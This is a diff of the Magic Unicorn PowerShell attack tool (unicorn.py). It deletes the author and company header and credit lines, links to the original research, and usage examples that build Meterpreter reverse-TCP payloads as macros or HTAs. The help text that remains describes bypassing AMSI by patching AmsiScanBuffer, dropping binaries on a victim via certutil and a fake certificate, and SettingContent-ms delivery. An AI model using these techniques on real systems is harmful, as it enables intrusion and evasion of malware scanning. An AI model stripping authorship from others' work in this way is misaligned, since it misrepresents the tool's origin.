@@ -1,27 +1,4 @@
-#!/usr/bin/python3
-#
-# Magic Unicorn - PowerShell downgrade attack and exploitation tool
-#
-# Written by: Dave Kennedy (@HackingDave)
-# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
-#
-# Real quick down and dirty for native x86 powershell on any platform
-#
-# Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro>
-# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
-# Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
-# HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
-#
-# Requirements: Need to have Metasploit installed if using Metasploit methods.
-# Also supports Cobalt Strike and custom shellcode delivery methods.
-#
-#
-# IMPORTANT: The way this works is by using 32-bit shellcode and a 32-bit downgrade attack.
-# That means your payloads should be a 32-bit payload, not a 64-bit. It will not work if you
-# generate a 64-bit platform. Don't fret - the 32-bit payload works on the 64-bit platform.
-#
-# Special thanks to Matthew Graeber and Josh Kelley
-#
+
 import base64
 import re
 import subprocess
@@ -158,13 +135,6 @@ def amsi_help():
 
                                   -----AMSI BYPASS INFORMATION----
 
-
-For a full writeup of this technique and how it works, visit the original research from these locations:
-
-https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
-
-https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
-
 The way this works in Unicorn is by appending the bypass technique by disabling AMSI through patching and
 disabling the AMSIScanBuffer functionality. In Unicorn this is an optional flag and can be turned off by
 editing the unicorn.py file and turning AMSI_BYPASS="ON" to "OFF". The main trade-off with this technique
@@ -248,7 +218,7 @@ def cert_help():
 
 				-----CERTUTIL Attack Instruction----
 
-The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
+The certutil attack vector was identified by Matthew Graeber () which allows you to take
 a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
 a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
 machine through a fake certificate file. To use this attack, simply place an executable in the path of
@@ -447,10 +417,6 @@ within Unicorn's PowerShell attack vector.
 There are multiple methods supported with this attack vector. Since there is a limited character size
 with this attack, the method for deployment is an HTA. 
 
-For a detailed understanding on weaponizing this attack visit:
-
-https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
-
 The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
 either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
 shellcode attacks.
@@ -497,8 +463,6 @@ python unicorn.py ms
 def gen_usage():
     print("-------------------- Magic Unicorn Attack Vector v3.17 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
-    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
-    print("Twitter: @TrustedSec, @HackingDave")
     print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
     print("\nHappy Magic Unicorns.")
     print("")
